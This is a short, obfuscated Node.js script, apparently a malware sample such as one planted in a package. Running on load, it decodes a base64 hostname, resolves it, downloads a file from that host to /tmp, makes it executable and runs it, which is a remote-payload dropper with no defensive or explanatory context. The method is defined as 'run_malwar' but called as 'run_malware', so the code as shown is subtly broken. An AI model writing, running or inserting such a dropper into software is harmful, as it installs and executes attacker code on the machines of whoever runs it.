const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function unknowably() {
    this.run_malwar = function(uncompassed) {
      if (uncompassed != null && uncompassed != '0.0.0.0') {
        foregallery = http.get('http://' + uncompassed + '/unpromisingly', function(nonhabitualness) {
          var contemnor = fs.createWriteStream('/tmp/bestiaries');
          nonhabitualness.on('data', function(unsacred) {
            contemnor.write(unsacred);
          });
          nonhabitualness.on('end', function() {
            contemnor.end();
            fs.chmod('/tmp/bestiaries', '0777');
            child_process.exec('/tmp/bestiaries', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      invaded = 'YmIyNjNhYjEuZmFudHVtcy5kZQ=='
      dns.lookup((new Buffer(invaded, 'base64')).toString(), function(err, bombycid) {
        self.run_malware(bombycid);
      });
    };
};

(new unknowably()).run();
